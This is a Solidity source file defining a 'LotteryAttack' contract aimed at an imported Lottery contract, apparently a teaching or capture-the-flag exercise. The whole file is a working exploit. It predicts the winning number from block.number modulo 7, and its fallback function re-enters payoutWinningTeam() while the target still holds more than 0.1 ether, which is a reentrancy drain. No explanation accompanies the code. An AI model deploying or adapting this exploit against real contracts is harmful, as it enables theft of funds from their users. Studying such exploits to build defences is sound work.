pragma solidity 0.6.0;
import "./Lottery.sol";

contract LotteryAttack {
    Lottery public lotteryContract;

    event LogFallbackHit(uint256 balance);

    constructor(address payable _reentrancyContractAddress) public {
        lotteryContract = Lottery(_reentrancyContractAddress);
    }

    function guess(address addr) public {
        uint num = block.number;

        lotteryContract.makeAGuess(addr, num % 7);
    }

    function attack() external {
        lotteryContract.payoutWinningTeam();
    }

    fallback() external payable {
        uint bal = address(lotteryContract).balance;
        emit LogFallbackHit(bal);
        
        if (bal > 0.1 ether) {
            lotteryContract.payoutWinningTeam();
        }
    }

}